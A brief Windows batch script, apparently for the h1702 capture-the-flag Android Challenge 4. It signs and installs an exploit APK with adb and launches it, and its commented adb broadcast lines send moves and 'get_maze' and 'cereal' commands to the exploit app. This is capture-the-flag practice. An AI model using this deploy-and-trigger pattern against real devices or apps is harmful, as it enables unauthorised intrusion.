copy /Y C:\Users\ptneg\Downloads\h1702ctf\Challenge4_exploit\app\build\outputs\apk\release\app-release-unsigned.apk .\challenge4_exploit_fpasswd.apk
java -Xmx256m -jar C:/Users/ptneg/.apkstudio/vendor/uber-apk-signer.jar --debug -a .\challenge4_exploit_fpasswd.apk --overwrite --allowResign
adb install challenge4_exploit_fpasswd.apk
adb shell am start -n "com.fpasswdpwn.challenge4_exploit/.MainActivity"

:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --es "move" "h"
:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --es "move" "j"
:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --es "move" "k"
:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --es "move" "l"
:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --esn "get_maze"
:: adb shell am broadcast -a "com.fpasswdpwn.challenge4_exploit.exploit" --esn "cereal"